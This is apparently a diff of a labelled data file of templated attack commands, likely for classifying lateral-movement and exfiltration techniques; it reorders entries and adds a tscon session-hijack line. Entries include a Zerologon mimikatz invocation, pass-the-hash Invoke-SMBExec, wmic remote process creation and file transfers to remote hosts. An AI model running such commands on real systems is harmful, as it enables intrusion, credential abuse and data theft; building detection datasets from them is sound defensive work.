@@ -1,17 +1,18 @@
-6	cat email.txt | ssmtp ${username}@${domain}
-5	Start-BitsTransfer -Source ${source_file_path} -Destination ${remote_destination}
-2	Invoke-SMBEnum -Target ${ip_address} -Domain ${domain} -Username ${username} -Hash ${ntlm} -Command ${command} -verbose
-2	Invoke-SMBExec -Target ${ip_address} -Domain ${domain} -Username ${username} -Hash ${ntlm} -Command ${command} -verbose
-7	Copy-Item ${source_file_path} -Destination ${share_file_path} -Recurse -Container
 6	echo -e ${email_content} | ssmtp ${username}@${domain}
-0	Start-BitsTransfer -Source ${source_file_path} -Destination ${media_file_path}
-4	"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}"
-8	lsadump::zerologon /target:${dc_name}.${domain} /account:${username} /exploit
-3	Enter-PSSession -ComputerName ${ip_address} -Port ${port} -Credential ${password}
-3	Enter-PSSession -ComputerName ${ip_address} -Credential ${password}
-7	Start-BitsTransfer -Source ${source_file_path} -Destination ${share_file_path}
-3	wmic /node:${ip_address} /user:${username} /password:${password} process call create "cmd.exe /c ${command}"
-0	pscp ${source_file_path} ${username}@${ip_address}:${media_file_path}
 5	Invoke-RestMethod -Uri ${remote_file} -OutFile ${local_path}
 3	Enter-PSSession -HostName ${username}@${ip_address}
+6	cat email.txt | ssmtp ${username}@${domain}
+0	pscp ${source_file_path} ${username}@${ip_address}:${media_file_path}
+3	wmic /node:${ip_address} /user:${username} /password:${password} process call create "cmd.exe /c ${command}"
+1	cmd /k tscon ${Session_ID} /dest:${Destination_ID}
+2	Invoke-SMBEnum -Target ${ip_address} -Domain ${domain} -Username ${username} -Hash ${ntlm} -Command ${command} -verbose
+3	Enter-PSSession -ComputerName ${ip_address} -Credential ${password}
+7	Start-BitsTransfer -Source ${source_file_path} -Destination ${share_file_path}
+8	lsadump::zerologon /target:${dc_name}.${domain} /account:${username} /exploit
+4	"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}"
+5	Start-BitsTransfer -Source ${source_file_path} -Destination ${remote_destination}
+3	Enter-PSSession -ComputerName ${ip_address} -Port ${port} -Credential ${password}
+7	Copy-Item ${source_file_path} -Destination ${share_file_path} -Recurse -Container
+2	Invoke-SMBExec -Target ${ip_address} -Domain ${domain} -Username ${username} -Hash ${ntlm} -Command ${command} -verbose
+0	Start-BitsTransfer -Source ${source_file_path} -Destination ${media_file_path}
 5	curl ${remote_destination} -o $ ${local_path}
